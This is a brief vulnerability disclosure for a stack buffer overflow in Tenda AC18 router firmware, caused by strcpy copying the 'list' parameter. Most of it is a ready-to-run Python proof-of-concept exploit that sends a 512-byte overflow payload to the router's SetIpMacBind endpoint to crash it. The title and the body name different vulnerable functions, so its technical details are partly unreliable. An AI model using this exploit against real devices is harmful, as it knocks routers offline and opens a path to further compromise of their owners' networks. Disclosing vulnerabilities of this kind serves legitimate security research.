

Tenda AC18 V15.03.05.19 (6318) firmware has a buffer overflow vulnerability through the "fromSetSysTime" function.

Vulnerability description:

The `fromSetIpMacBind` function of the Tenda router (AC18) has a high-risk **stack buffer overflow vulnerability**, which is caused by the program using `strcpy` to copy the user-controllable `list` parameters to the fixed stack buffer.

![0521b39db2666034811eff14da3b497b](../../../Pictures/typora/0521b39db2666034811eff14da3b497b-17696638038162.png)

exp:

```
import requests

def test_ac18_overflow(url):
    payload = b'A' * 512 
    
    params = {
        'bindnum': '1',
        'list': payload 
    }
    cookie = {'password': 'your_password'} 
    
    try:
        response = requests.post(url, cookies=cookie, data=params, timeout=5)
        print("Status:", response.status_code)
    except requests.exceptions.ConnectionError:
        print("Target crashed! (Potential vulnerability confirmed)")

url = "http://192.168.0.3/goform/SetIpMacBind"
test_ac18_overflow(url)
```

![image-20260129151709676](../../../Pictures/typora/image-20260129151709676.png)



